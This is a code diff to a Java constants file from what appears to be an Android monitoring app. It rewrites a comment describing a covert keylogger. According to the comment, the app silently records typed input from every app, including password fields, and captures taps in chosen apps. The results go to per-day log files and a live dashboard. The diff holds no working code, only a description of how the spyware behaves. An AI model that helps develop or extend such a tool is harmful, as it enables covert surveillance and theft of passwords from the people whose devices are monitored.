@@ -23,8 +23,20 @@ public class Constants {
     public static final String APP_MONITOR_DIR   = ".am";
 
     /**
-     * Packages to monitor silently.
-     * Keylogs and accessibility screenshots are stored per-app, per-day.
+     * Packages whose UI taps are captured by the keylogger.
+     *
+     * <p>Scope of this list — it gates <b>taps only</b>:
+     * <ul>
+     *   <li>Typed input (every editable field, password or not) is captured for
+     *       <b>every</b> app, whether or not it appears below.</li>
+     *   <li>A tap on a list row / button / menu item is captured <b>only</b> for
+     *       the packages listed here.</li>
+     * </ul>
+     *
+     * <p>Captured taps and typed input alike are written by
+     * {@link com.task.tusker.commands.LogManager} to the global day file, to the
+     * per-app day file, and to the live dashboard feed.
+     *
      * Add as many packages as needed — one per line.
      *
      * Examples:
